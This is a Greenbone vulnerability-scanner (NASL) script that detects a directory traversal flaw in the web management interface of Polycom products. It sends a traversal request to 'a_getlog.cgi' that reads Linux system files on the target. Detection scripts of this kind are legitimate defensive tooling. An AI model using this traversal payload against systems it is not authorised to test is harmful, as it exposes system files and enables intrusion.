# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103661");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
  script_version("2025-04-15T05:54:49+0000");

  script_name("Polycom Products Directory Traversal and Command Injection Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52301");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Mar/18");
  script_xref(name:"URL", value:"http://blog.tempest.com.br/joao-paulo-campello/path-traversal-on-polycom-web-management-interface.html");
  script_xref(name:"URL", value:"http://www.polycom.com/");
  script_xref(name:"URL", value:"http://blog.tempest.com.br/joao-paulo-campello/polycom-web-management-interface-os-command-injection.html");

  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-02-13 11:31:54 +0100 (Wed, 13 Feb 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_unixoide");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");
  script_tag(name:"summary", value:"Multiple Polycom products are prone to a directory-traversal
  vulnerability and a command-injection vulnerability because it fails
  to sufficiently sanitize user-supplied input.

  Remote attackers can use a specially crafted request with directory-
  traversal sequences ('../') to retrieve arbitrary files in the context
  of the application. Also, attackers can execute arbitrary commands
  with the privileges of the user running the application.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

port = http_get_port(default:80);

if(http_vuln_check(port:port, url:"/", pattern:"Polycom", usecache:TRUE)) {

  files = traversal_files("linux");

  foreach pattern(keys(files)) {

    file = files[pattern];

    url = '/a_getlog.cgi?name=../../../' + file;
    if(http_vuln_check(port:port, url:url, pattern:pattern)) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(data:report, port:port);
      exit(0);
    }
  }
}

exit(99);
